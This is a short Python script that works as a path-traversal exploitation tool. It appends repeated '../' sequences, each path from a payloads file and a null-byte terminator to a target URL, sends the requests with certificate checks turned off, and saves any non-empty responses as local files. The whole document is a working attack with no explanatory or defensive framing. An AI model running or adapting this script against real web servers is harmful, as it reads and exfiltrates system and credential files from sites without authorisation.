import requests as r
import sys

url = str(sys.argv[1])
document = str(sys.argv[2])
payloads = open('payloads.txt', 'r')
for p in payloads.readlines():
	r.packages.urllib3.disable_warnings()
	payload = str(p).rstrip('\n')
	_url = url + '../../../../../../../../' + payload + '%00'
	req = r.request('GET', _url, verify=False)
	if (req.headers['Content-Length'] != '0'):
		file = open(document+'_'+str(payload.replace('/','_'))+'.txt', 'w')
		file.write(req.text)
		file.close()
